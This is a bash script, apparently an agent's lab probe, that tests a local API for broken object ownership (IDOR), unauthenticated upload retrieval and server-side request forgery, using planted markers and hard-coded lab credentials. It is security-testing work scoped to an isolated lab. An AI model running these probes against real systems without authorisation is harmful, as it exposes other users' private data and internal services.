#!/usr/bin/env bash
set -Eeuo pipefail
TARGET="${TARGET:-http://127.0.0.1:18080}"
RUN_ID="modern_api_wave1_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/codex-output/$RUN_ID"
mkdir -p "$OUT"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 10 "$1" 2>/dev/null || echo 000; }
sha(){ sha256sum "$1" 2>/dev/null | awk '{print $1}' || true; }

PRE=$(status "$TARGET/health")
json_obs category=health name=pre status="$PRE" target="$TARGET"
{
  echo "# Modern API Lab Wave 1"
  echo "target: $TARGET"
  echo "pre_health: $PRE"
  echo
} > "$SUMMARY"

login(){
  local user=$1 pass=$2 out=$3 code
  code=$(curl -sS --max-time 10 -o "$out" -w '%{http_code}' -H 'Content-Type: application/json' --data "{\"username\":\"$user\",\"password\":\"$pass\"}" "$TARGET/api/login" || echo 000)
  python3 - "$out" <<'PY'
import json,sys
try: print(json.load(open(sys.argv[1])).get('token',''))
except Exception: print('')
PY
  return 0
}
ALICE_BODY="$OUT/login_alice.json"
BOB_BODY="$OUT/login_bob.json"
ALICE_TOKEN=$(login alice alicepass "$ALICE_BODY")
BOB_TOKEN=$(login bob bobpass "$BOB_BODY")
json_obs category=auth user=alice token_present=$([ -n "$ALICE_TOKEN" ] && echo true || echo false) body="$ALICE_BODY"
json_obs category=auth user=bob token_present=$([ -n "$BOB_TOKEN" ] && echo true || echo false) body="$BOB_BODY"
echo "## Auth" >> "$SUMMARY"
echo "alice_token_present=$([ -n "$ALICE_TOKEN" ] && echo true || echo false)" >> "$SUMMARY"
echo "bob_token_present=$([ -n "$BOB_TOKEN" ] && echo true || echo false)" >> "$SUMMARY"

# IDOR/object ownership proof: alice reads bob profile and bob invoice.
echo >> "$SUMMARY"; echo "## IDOR / object ownership" >> "$SUMMARY"
for endpoint in "/api/me" "/api/users/1" "/api/users/2" "/api/invoices/1001" "/api/invoices/2001"; do
  safe=$(echo "$endpoint" | sed 's#[/%]#_#g')
  body="$OUT/alice_${safe}.json"
  code=$(curl -sS --max-time 10 -o "$body" -w '%{http_code}' -H "Authorization: Bearer $ALICE_TOKEN" "$TARGET$endpoint" || echo 000)
  marker=$(grep -aoE 'BOB_PRIVATE_INVOICE_MARKER|PROFILE_MARKER_BOB|ALICE_PRIVATE_INVOICE_MARKER|PROFILE_MARKER_ALICE' "$body" 2>/dev/null | tr '\n' ',' | sed 's/,$//' || true)
  json_obs category=idor actor=alice endpoint="$endpoint" status="$code" marker="$marker" body="$body"
  echo "alice GET $endpoint -> $code marker=$marker" >> "$SUMMARY"
done

# Upload retrieval proof.
echo >> "$SUMMARY"; echo "## Upload retrieval" >> "$SUMMARY"
MARK="MODERN_UPLOAD_MARKER_$(date -u +%Y%m%dT%H%M%SZ)"
printf '%s\n' "$MARK" > "$OUT/upload_marker.txt"
UPLOAD_BODY="$OUT/upload_response.json"
UPLOAD_CODE=$(curl -sS --max-time 10 -o "$UPLOAD_BODY" -w '%{http_code}' -H "Authorization: Bearer $ALICE_TOKEN" -H 'Content-Type: text/plain' -H 'X-Filename: vf_modern_marker.txt' --data-binary "@$OUT/upload_marker.txt" "$TARGET/upload" || echo 000)
UPLOAD_ID=$(python3 - "$UPLOAD_BODY" <<'PY'
import json,sys
try: print(json.load(open(sys.argv[1])).get('upload_id',''))
except Exception: print('')
PY
)
RETR_BODY="$OUT/upload_retrieved.txt"
if [ -n "$UPLOAD_ID" ]; then
  RETR_CODE=$(curl -sS --max-time 10 -o "$RETR_BODY" -w '%{http_code}' "$TARGET/uploads/$UPLOAD_ID" || echo 000)
else
  RETR_CODE=not_run
fi
FOUND=no; [ -f "$RETR_BODY" ] && grep -q "$MARK" "$RETR_BODY" && FOUND=yes
json_obs category=upload status="$UPLOAD_CODE" upload_id="$UPLOAD_ID" retrieve_status="$RETR_CODE" marker_found="$FOUND" upload_body="$UPLOAD_BODY" retrieve_body="$RETR_BODY"
echo "upload -> $UPLOAD_CODE upload_id=$UPLOAD_ID retrieve=$RETR_CODE marker_found=$FOUND" >> "$SUMMARY"

# SSRF isolated callback proof: target fetches its own callback endpoint.
echo >> "$SUMMARY"; echo "## SSRF isolated callback" >> "$SUMMARY"
CALLBACK_URL="$TARGET/callback?marker=SSRF_MARKER"
FETCH_BODY="$OUT/ssrf_fetch.json"
FETCH_CODE=$(curl -sS --max-time 10 -o "$FETCH_BODY" -w '%{http_code}' --get --data-urlencode "url=$CALLBACK_URL" "$TARGET/fetch" || echo 000)
LOG_BODY="$OUT/callback_log.json"
LOG_CODE=$(curl -sS --max-time 10 -o "$LOG_BODY" -w '%{http_code}' "$TARGET/callback-log" || echo 000)
CALLBACK_COUNT=$(python3 - "$LOG_BODY" <<'PY'
import json,sys
try: print(len(json.load(open(sys.argv[1])).get('callbacks',[])))
except Exception: print('0')
PY
)
json_obs category=ssrf fetch_status="$FETCH_CODE" callback_log_status="$LOG_CODE" callback_count="$CALLBACK_COUNT" fetch_body="$FETCH_BODY" log_body="$LOG_BODY"
echo "fetch callback -> $FETCH_CODE callback_log=$LOG_CODE callback_count=$CALLBACK_COUNT" >> "$SUMMARY"

POST=$(status "$TARGET/health")
json_obs category=health name=post status="$POST" target="$TARGET"
echo >> "$SUMMARY"; echo "post_health: $POST" >> "$SUMMARY"
echo "$OUT" > "$HOME/codex-output/latest_modern_api_wave1.txt"
echo "$OUT"
